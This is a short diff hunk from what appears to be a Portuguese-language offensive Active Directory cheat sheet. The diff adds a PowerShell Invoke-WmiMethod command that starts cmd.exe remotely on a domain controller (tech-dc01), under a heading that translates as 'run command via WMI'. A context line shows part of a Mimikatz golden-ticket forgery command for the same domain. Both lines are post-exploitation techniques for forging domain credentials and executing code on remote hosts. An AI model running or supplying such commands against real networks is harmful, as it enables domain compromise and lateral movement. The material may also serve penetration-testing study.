@@ -1432,7 +1432,7 @@ kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-43397997
 ```
 RODAR COMANDO VIA WMI:
 ```
-aaa
+Invoke-WmiMethod win32_process -ComputerName tech-dc01.tech.local -name create -argumentlist "cmd.exe /c whoami > c:\fudeu.txt"
 ```
 
 
